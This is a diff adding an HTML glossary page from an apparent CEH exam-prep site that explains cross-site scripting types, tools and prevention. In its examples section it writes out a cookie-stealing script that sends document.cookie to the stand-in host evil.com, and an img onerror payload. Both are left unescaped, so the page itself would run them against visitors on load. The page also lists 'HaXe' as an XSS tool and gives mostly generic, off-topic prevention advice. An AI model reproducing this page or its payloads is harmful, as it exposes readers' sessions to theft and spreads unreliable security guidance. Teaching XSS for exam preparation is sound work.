@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cross-Site Scripting (XSS) — Definition, Types & CEH Exam Guide | CEHStudy</title>
+    <meta name="description" content="What is XSS? Complete guide to reflected, stored, and DOM-based cross-site scripting attacks. Learn XSS payloads, prevention techniques, and how it appears on the CEH v13 exam.">
+    <meta name="keywords" content="cross-site scripting, XSS, reflected XSS, stored XSS, DOM-based XSS, XSS payload, XSS prevention">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://cehstudy.com/glossary-terms/cross-site-scripting/">
+
+    <link rel="alternate" hreflang="en-us" href="https://cehstudy.com/">
+    <link rel="alternate" hreflang="x-default" href="https://cehstudy.com/">
+
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "DefinedTerm",
+        "name": "Cross-Site Scripting",
+        "termCode": "XSS",
+        "inDefinedTermSet": {
+            "@type": "DefinedTermSet",
+            "name": "CEH Study Glossary",
+            "url": "https://cehstudy.com/glossary-terms/"
+        },
+        "description": "Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious JavaScript or HTML into web pages viewed by other users. The injected script executes in the victim's browser with the victim's permissions, enabling session theft, data exfiltration, and account compromise."
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "FAQPage",
+        "mainEntity": [
+            {
+                "@type": "Question",
+                "name": "What is Cross-Site Scripting?",
+                "acceptedAnswer": {
+                    "@type": "Answer",
+                    "text": "Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious JavaScript or HTML into web pages viewed by other users. The injected script executes in the victim's browser with the victim's permissions, enabling session theft, data exfiltration, and account compromise."
+                }
+            },
+            {
+                "@type": "Question",
+                "name": "How does Cross-Site Scripting appear on the CEH v13 exam?",
+                "acceptedAnswer": {
+                    "@type": "Answer",
+                    "text": "XSS is covered in CEH v13 Module 14 (Hacking Web Applications) and the OWASP Top 10. Exam questions test your ability to identify XSS vectors in code samples, distinguish between reflected/stored/DOM-based variants, understand browser security context (same-origin policy bypass via session cookies), and apply prevention measures like Content Security Policy (CSP) headers and output encoding."
+                }
+            }
+        ]
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+            {"@type": "ListItem", "position": 1, "name": "Home", "item": "https://cehstudy.com/"},
+            {"@type": "ListItem", "position": 2, "name": "Glossary Terms", "item": "https://cehstudy.com/glossary-terms/"},
+            {"@type": "ListItem", "position": 3, "name": "Cross-Site Scripting", "item": "https://cehstudy.com/glossary-terms/cross-site-scripting/"}
+        ]
+    }
+    </script>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        :root{--bg:#151515;--bg2:#1e1e1e;--bg3:#2c2c2c;--text:#d1d0c5;--text2:#646669;--accent:#39ff88;--border:#2c2c2c}
+        body{font-family:'JetBrains Mono','Fira Code',Consolas,monospace;background:var(--bg);color:var(--text);line-height:1.7;min-height:100vh;display:flex;flex-direction:column}
+        header{background:var(--bg2);border-bottom:1px solid var(--border);padding:12px 20px;display:flex;justify-content:space-between;align-items:center}
+        header a{color:var(--accent);text-decoration:none;font-size:.9rem}
+        .nav-links{display:flex;gap:16px}
+        .nav-links a{color:var(--text2);font-size:.8rem;transition:color .2s}
+        .nav-links a:hover{color:var(--accent)}
+        .container{max-width:850px;margin:0 auto;padding:30px 20px;flex:1}
+        h1{font-size:1.4rem;color:var(--accent);margin-bottom:16px;line-height:1.4}
+        h2{font-size:1.1rem;color:var(--accent);margin-top:32px;margin-bottom:12px;padding-bottom:6px;border-bottom:1px solid var(--border)}
+        h3{font-size:.98rem;color:var(--text);margin-top:16px;margin-bottom:8px}
+        p{margin-bottom:14px;font-size:.92rem}
+        ul,ol{margin-bottom:14px;padding-left:20px}
+        li{margin-bottom:8px;font-size:.9rem}
+        a{color:var(--accent);text-decoration:none}
+        a:hover{text-decoration:underline}
+        .definition-box{background:var(--bg2);border-left:3px solid var(--accent);padding:16px 20px;margin:20px 0;border-radius:0 4px 4px 0}
+        .definition-box p{margin:0;font-size:.95rem;line-height:1.8}
+        .tool-list{display:flex;flex-wrap:wrap;gap:8px;margin:12px 0}
+        .tool-tag{background:var(--bg3);padding:4px 10px;border-radius:3px;font-size:.82rem;color:var(--text)}
+        .example-box{background:var(--bg2);border:1px solid var(--border);padding:14px 16px;margin:10px 0;border-radius:4px;font-size:.85rem}
+        .example-box strong{color:var(--accent)}
+        footer{background:var(--bg2);border-top:1px solid var(--border);padding:20px;text-align:center;font-size:.75rem;color:var(--text2)}
+        footer a{color:var(--text2)}
+        .related-list li{font-size:.88rem}
+    </style>
+</head>
+<body>
+    <header>
+        <a href="/"></> CEHStudy</a>
+        <nav class="nav-links">
+            <a href="/glossary-terms/">Glossary</a>
+            <a href="/ceh-v13-study-guide/">Study Guide</a>
+            <a href="/ceh-practice-questions/">Practice</a>
+            <a href="/">Home</a>
+        </nav>
+    </header>
+
+    <div class="container">
+        <h1>Cross-Site Scripting</h1>
+
+        <div class="definition-box">
+            <p>Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious JavaScript or HTML into web pages viewed by other users. The injected script executes in the victim's browser with the victim's permissions, enabling session theft, data exfiltration, and account compromise.</p>
+        </div>
+
+        <h2>Types & Variations</h2>
+        <ul>
+            <li>Reflected (Non-Persistent) XSS — Malicious script is injected via URL parameters or form fields and reflected in the response without sanitization</li>
+            <li>Stored (Persistent) XSS — Malicious script is saved on the server (e.g., in a database via comments, profiles) and executes for every user who views the affected content</li>
+            <li>DOM-based XSS — Exploits client-side DOM manipulation where unsanitized user input directly modifies the Document Object Model without a round-trip to the server</li>
+            <li>Mutation XSS (mXSS) — Exploits HTML sanitization by crafting payloads that pass validation but mutate into executable script in the browser's HTML parser</li>
+        </ul>
+
+        <h2>Common Tools & Techniques</h2>
+        <div class="tool-list">
+            <span class="tool-tag">Burp Suite (XSS Scanner)</span>
+            <span class="tool-tag">OWASP ZAP</span>
+            <span class="tool-tag">DalFox</span>
+            <span class="tool-tag">HaXe</span>
+        </div>
+        <p>Ethical hackers and security professionals use these tools in authorized penetration tests and red team operations. Unauthorized use is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent legislation worldwide.</p>
+
+        <h2>Real-World Examples</h2>
+        <div class="example-box"><strong>Session Theft:</strong> <script>document.location="http://evil.com/?c="+document.cookie</script> — steals session cookie</div>
+        <div class="example-box"><strong>DOM-based:</strong> Location hash passed to document.write() without sanitization creates an XSS sink</div>
+        <div class="example-box"><strong>Stored:</strong> A comment field containing <img src=x onerror=alert(document.cookie)> executes for every reader</div>
+
+        <h2>How Cross-Site Scripting Appears on the CEH v13 Exam</h2>
+        <p>XSS is covered in CEH v13 Module 14 (Hacking Web Applications) and the OWASP Top 10. Exam questions test your ability to identify XSS vectors in code samples, distinguish between reflected/stored/DOM-based variants, understand browser security context (same-origin policy bypass via session cookies), and apply prevention measures like Content Security Policy (CSP) headers and output encoding.</p>
+
+        <h2>Prevention & Detection</h2>
+        <ul>
+            <li><strong>Input Validation:</strong> Implement strict allowlist-based input validation on all user-facing parameters</li>
+            <li><strong>Principle of Least Privilege:</strong> Run applications with minimum required permissions</li>
+            <li><strong>Regular Patching:</strong> Maintain timely vulnerability management and patch deployment</li>
+            <li><strong>Network Segmentation:</strong> Limit lateral movement through zone-based network architecture</li>
+            <li><strong>Monitoring & Alerting:</strong> Deploy SIEM/SOAR solutions with threat detection rules for anomalous activity</li>
+        </ul>
+
+        <h2>Related Glossary Terms</h2>
+        <ul class="related-list">
+            <li><a href="/glossary-terms/csrf/">CSRF</a> — Often combined with XSS for full account takeover</li>
+            <li><a href="/glossary-terms/sql-injection/">SQL Injection</a> — Both are injection-based attacks in OWASP Top 10</li>
+            <li><a href="/ceh-v13/module-14/">Module 14: Hacking Web Applications</a> — Full module covering web app attack surface</li>
+        </ul>
+
+        <h2>Study Resources</h2>
+        <ul>
+            <li><a href="/ceh-v13/">CEH v13 Module Flashcards</a></li>
+            <li><a href="/ceh-practice-questions/">Practice Exam Questions</a></li>
+            <li><a href="/ceh-exam-domains/">CEH v13 Exam Domains & Blueprint</a></li>
+            <li><a href="/glossary-terms/">Full Glossary Index</a></li>
+        </ul>
+    </div>
+
+    <footer>
+        <p>CEHStudy — Free CEH v13 exam preparation resources. Not affiliated with EC-Council.</p>
+        <p><a href="/about/">About</a> · <a href="/faq/">FAQ</a> · <a href="/changelog/">Changelog</a> · <a href="/disclaimer/">Disclaimer</a></p>
+    </footer>
+</body>
+</html>
